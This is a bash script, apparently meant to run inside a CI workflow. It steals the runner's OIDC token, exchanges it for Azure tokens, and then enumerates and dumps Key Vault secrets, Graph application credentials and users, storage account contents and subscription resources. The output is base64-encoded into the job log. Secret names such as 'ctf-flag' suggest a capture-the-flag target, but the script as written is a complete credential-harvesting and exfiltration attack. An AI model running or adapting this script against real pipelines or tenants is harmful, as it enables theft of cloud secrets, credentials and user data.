#!/usr/bin/env bash
set +e
T="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
C="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"

echo "=== OIDC ==="
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"

echo "=== Vault token (OIDC SP) ==="
VAULT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://vault.azure.net/.default")
VTOK=$(echo "$VAULT_RESP" | jq -r .access_token)
echo "VTOK_LEN=${#VTOK}"

echo "=== KV2: kv-tbl-sec-x3euoz ==="
KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"
KV2_LIST=$(curl -sS "$KV2/secrets?api-version=7.4" -H "Authorization: Bearer $VTOK")
echo "KV2_LIST_B64=$(echo "$KV2_LIST" | base64 -w0)"

echo "=== KV2 individual secrets ==="
for NAME in flag ctf-flag the-flag tbl-flag secret data-export-key admin-password master-key storage-key backup-key reporting-key connection-string config-secret; do
  RESP=$(curl -sS "$KV2/secrets/$NAME?api-version=7.4" -H "Authorization: Bearer $VTOK")
  VAL=$(echo "$RESP" | jq -r '.value // empty' 2>/dev/null)
  ERR=$(echo "$RESP" | jq -r '.error.message // empty' 2>/dev/null)
  if [ -n "$VAL" ]; then
    echo "KV2_${NAME}_B64=$(echo "$VAL" | base64 -w0)"
  else
    echo "KV2_${NAME}_ERR=$(echo "$ERR" | head -c 100)"
  fi
done

echo "=== Graph: list apps ==="
GRAPH_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://graph.microsoft.com/.default")
GT=$(echo "$GRAPH_RESP" | jq -r .access_token)
echo "GT_LEN=${#GT}"

if [ "${#GT}" -gt 100 ]; then
  APPS=$(curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,keyCredentials,passwordCredentials" -H "Authorization: Bearer $GT")
  echo "GRAPH_APPS_B64=$(echo "$APPS" | base64 -w0)"
  
  SPS=$(curl -sS "https://graph.microsoft.com/v1.0/servicePrincipals?\$select=displayName,appId" -H "Authorization: Bearer $GT")
  echo "GRAPH_SPS_B64=$(echo "$SPS" | base64 -w0)"
  
  USERS=$(curl -sS "https://graph.microsoft.com/v1.0/users?\$select=displayName,userPrincipalName,mail" -H "Authorization: Bearer $GT")
  echo "GRAPH_USERS_B64=$(echo "$USERS" | base64 -w0)"
fi

echo "=== Storage token ==="
STOR_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://storage.azure.com/.default")
ST=$(echo "$STOR_RESP" | jq -r .access_token)
echo "ST_LEN=${#ST}"

if [ "${#ST}" -gt 100 ]; then
  for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz sttblarchiveprodx3euoz sttblsecretsprodx3euoz sttblreportprodx3euoz sttblflagprodx3euoz; do
    CONT=$(curl -sS "https://$SA.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $ST" -H "x-ms-version: 2020-10-02" 2>&1)
    STATUS=$(echo "$CONT" | head -c 3)
    if echo "$CONT" | grep -qi "container\|blob\|flag"; then
      echo "SA_${SA}_B64=$(echo "$CONT" | base64 -w0)"
    else
      echo "SA_${SA}=$(echo "$CONT" | head -c 150)"
    fi
  done
fi

echo "=== Management: list ALL resources ==="
MGMT_RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d "client_id=$C&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&grant_type=client_credentials&scope=https://management.azure.com/.default")
MT=$(echo "$MGMT_RESP" | jq -r .access_token)
echo "MT_LEN=${#MT}"

SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
if [ "${#MT}" -gt 100 ]; then
  RESOURCES=$(curl -sS "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT")
  echo "RESOURCES_B64=$(echo "$RESOURCES" | base64 -w0)"
  
  RGS=$(curl -sS "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" -H "Authorization: Bearer $MT")
  echo "RGS_B64=$(echo "$RGS" | base64 -w0)"
fi

echo "=== DONE ==="